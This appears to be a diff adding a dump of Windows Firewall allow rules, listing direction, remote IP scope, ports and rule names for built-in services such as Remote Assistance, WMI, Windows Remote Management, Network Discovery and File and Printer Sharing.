+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 135
+ApplicationName : Remote Assistance (DCOM-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (RA Server TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (RA Server TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (PNRP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 3540
+ApplicationName : Remote Assistance (PNRP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Remote Assistance (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Windows Firewall Remote Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Windows Firewall Remote Management (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Windows Firewall Remote Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Windows Firewall Remote Management (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 80
+ApplicationName : Windows Remote Management - Compatibility Mode (HTTP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 80
+ApplicationName : Windows Remote Management - Compatibility Mode (HTTP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5985
+ApplicationName : Windows Remote Management (HTTP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 5985
+ApplicationName : Windows Remote Management (HTTP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Event Log Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 445
+ApplicationName : Remote Event Log Management (NP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Event Log Management (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Event Log Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 445
+ApplicationName : Remote Event Log Management (NP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Event Log Management (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Distributed Transaction Coordinator (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Distributed Transaction Coordinator (RPC)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Distributed Transaction Coordinator (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Distributed Transaction Coordinator (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Distributed Transaction Coordinator (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Distributed Transaction Coordinator (RPC)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Distributed Transaction Coordinator (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Distributed Transaction Coordinator (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Scheduled Tasks Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Scheduled Tasks Management (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Scheduled Tasks Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Scheduled Tasks Management (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Service Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 445
+ApplicationName : Remote Service Management (NP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Service Management (RPC)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : Remote Service Management (RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 445
+ApplicationName : Remote Service Management (NP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : Remote Service Management (RPC)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5357
+LocalPort       : *
+ApplicationName : Network Discovery (WSD Events-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5357
+ApplicationName : Network Discovery (WSD Events-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5358
+LocalPort       : *
+ApplicationName : Network Discovery (WSD EventsSecure-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5358
+ApplicationName : Network Discovery (WSD EventsSecure-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Network Discovery (Pub WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Network Discovery (Pub-WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5355
+LocalPort       : *
+ApplicationName : Network Discovery (LLMNR-UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5355
+ApplicationName : Network Discovery (LLMNR-UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Network Discovery (WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Network Discovery (WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 138
+LocalPort       : *
+ApplicationName : Network Discovery (NB-Datagram-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 138
+ApplicationName : Network Discovery (NB-Datagram-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 137
+LocalPort       : *
+ApplicationName : Network Discovery (NB-Name-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 137
+ApplicationName : Network Discovery (NB-Name-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Network Discovery (UPnP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2869
+ApplicationName : Network Discovery (UPnP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Network Discovery (UPnPHost-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Network Discovery (SSDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Network Discovery (SSDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5357
+LocalPort       : *
+ApplicationName : Network Discovery (WSD Events-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5357
+ApplicationName : Network Discovery (WSD Events-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5358
+LocalPort       : *
+ApplicationName : Network Discovery (WSD EventsSecure-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5358
+ApplicationName : Network Discovery (WSD EventsSecure-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Network Discovery (Pub WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Network Discovery (Pub-WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5355
+LocalPort       : *
+ApplicationName : Network Discovery (LLMNR-UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5355
+ApplicationName : Network Discovery (LLMNR-UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 3702
+LocalPort       : *
+ApplicationName : Network Discovery (WSD-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 3702
+ApplicationName : Network Discovery (WSD-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 138
+LocalPort       : *
+ApplicationName : Network Discovery (NB-Datagram-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 138
+ApplicationName : Network Discovery (NB-Datagram-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 137
+LocalPort       : *
+ApplicationName : Network Discovery (NB-Name-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 137
+ApplicationName : Network Discovery (NB-Name-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Network Discovery (UPnPHost-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Network Discovery (UPnP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 2869
+ApplicationName : Network Discovery (UPnP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 1900
+LocalPort       : *
+ApplicationName : Network Discovery (SSDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 1900
+ApplicationName : Network Discovery (SSDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 5357
+LocalPort       : *
+ApplicationName : Network Discovery (WSD Events-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 5357
+ApplicationName : Network Discovery (WSD Events-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 5358
+LocalPort       : *
+ApplicationName : Network Discovery (WSD EventsSecure-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 5358
+ApplicationName : Network Discovery (WSD EventsSecure-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 138
+LocalPort       : *
+ApplicationName : Network Discovery (NB-Datagram-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 138
+ApplicationName : Network Discovery (NB-Datagram-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 137
+LocalPort       : *
+ApplicationName : Network Discovery (NB-Name-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 137
+ApplicationName : Network Discovery (NB-Name-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Network Discovery (UPnP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 2869
+ApplicationName : Network Discovery (UPnP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 1723
+LocalPort       : *
+ApplicationName : Routing and Remote Access (PPTP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 1723
+ApplicationName : Routing and Remote Access (PPTP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 1701
+LocalPort       : *
+ApplicationName : Routing and Remote Access (L2TP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 1701
+ApplicationName : Routing and Remote Access (L2TP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Routing and Remote Access (GRE-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Routing and Remote Access (GRE-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Management Instrumentation (ASync-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Management Instrumentation (WMI-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Management Instrumentation (WMI-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 135
+ApplicationName : Windows Management Instrumentation (DCOM-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Management Instrumentation (ASync-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Management Instrumentation (WMI-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Windows Management Instrumentation (WMI-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 135
+ApplicationName : Windows Management Instrumentation (DCOM-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : iSCSI Service (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : iSCSI Service (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : iSCSI Service (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : iSCSI Service (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 135
+ApplicationName : Performance Logs and Alerts (DCOM-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Performance Logs and Alerts (TCP-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 135
+ApplicationName : Performance Logs and Alerts (DCOM-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Performance Logs and Alerts (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Core Networking - Group Policy (LSASS-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 53
+LocalPort       : *
+ApplicationName : Core Networking - DNS (UDP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Core Networking - Group Policy (TCP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 445
+LocalPort       : *
+ApplicationName : Core Networking - Group Policy (NP-Out)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - IPv6 (IPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - IPv6 (IPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : IPHTTPS
+LocalPort       : *
+ApplicationName : Core Networking - IPHTTPS (TCP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : IPHTTPS
+ApplicationName : Core Networking - IPHTTPS (TCP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : *
+ApplicationName : Core Networking - Teredo (UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : Teredo
+ApplicationName : Core Networking - Teredo (UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 547
+LocalPort       : 546
+ApplicationName : Core Networking - Dynamic Host Configuration Protocol for IPv
+                  6(DHCPV6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 547
+LocalPort       : 546
+ApplicationName : Core Networking - Dynamic Host Configuration Protocol for IPv
+                  6(DHCPV6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 67
+LocalPort       : 68
+ApplicationName : Core Networking - Dynamic Host Configuration Protocol (DHCP-O
+                  ut)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 67
+LocalPort       : 68
+ApplicationName : Core Networking - Dynamic Host Configuration Protocol (DHCP-I
+                  n)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Internet Group Management Protocol (IGMP-Ou
+                  t)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Internet Group Management Protocol (IGMP-In
+                  )
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Destination Unreachable Fragmentation Neede
+                  d (ICMPv4-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Done (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Done (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Report v2 (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Report v2 (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Report (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Report (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Query (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Multicast Listener Query (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet,fe80::/64,ff02::2-ff02::2
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Router Solicitation (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Router Solicitation (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet,fe80::/64,ff02::1-ff02::1
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Router Advertisement (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : fe80::/64
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Router Advertisement (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Neighbor Discovery Advertisement (ICMPv6-Ou
+                  t)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Neighbor Discovery Advertisement (ICMPv6-In
+                  )
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Neighbor Discovery Solicitation (ICMPv6-Out
+                  )
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Neighbor Discovery Solicitation (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Parameter Problem (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Parameter Problem (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Time Exceeded (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Time Exceeded (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Packet Too Big (ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Packet Too Big (ICMPv6-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : Core Networking - Destination Unreachable (ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 5355
+LocalPort       : *
+ApplicationName : File and Printer Sharing (LLMNR-UDP-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 5355
+ApplicationName : File and Printer Sharing (LLMNR-UDP-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv4-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv4-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : File and Printer Sharing (Spooler Service - RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : File and Printer Sharing (Spooler Service - RPC)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 138
+LocalPort       : *
+ApplicationName : File and Printer Sharing (NB-Datagram-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 138
+ApplicationName : File and Printer Sharing (NB-Datagram-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 137
+LocalPort       : *
+ApplicationName : File and Printer Sharing (NB-Name-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 137
+ApplicationName : File and Printer Sharing (NB-Name-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 445
+LocalPort       : *
+ApplicationName : File and Printer Sharing (SMB-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 445
+ApplicationName : File and Printer Sharing (SMB-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : LocalSubnet
+RemotePort      : 139
+LocalPort       : *
+ApplicationName : File and Printer Sharing (NB-Session-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : LocalSubnet
+RemotePort      : *
+LocalPort       : 139
+ApplicationName : File and Printer Sharing (NB-Session-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv6-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv6-In)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv4-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : 
+LocalPort       : 
+ApplicationName : File and Printer Sharing (Echo Request - ICMPv4-In)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC-EPMap
+ApplicationName : File and Printer Sharing (Spooler Service - RPC-EPMAP)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : RPC
+ApplicationName : File and Printer Sharing (Spooler Service - RPC)
+
+Action          : Allow
+Direction       : Outbound
+RemoteIP        : *
+RemotePort      : 138
+LocalPort       : *
+ApplicationName : File and Printer Sharing (NB-Datagram-Out)
+
+Action          : Allow
+Direction       : Inbound
+RemoteIP        : *
+RemotePort      : *
+LocalPort       : 138
+ApplicationName : File and Printer Sharing (NB-Datagram-In)
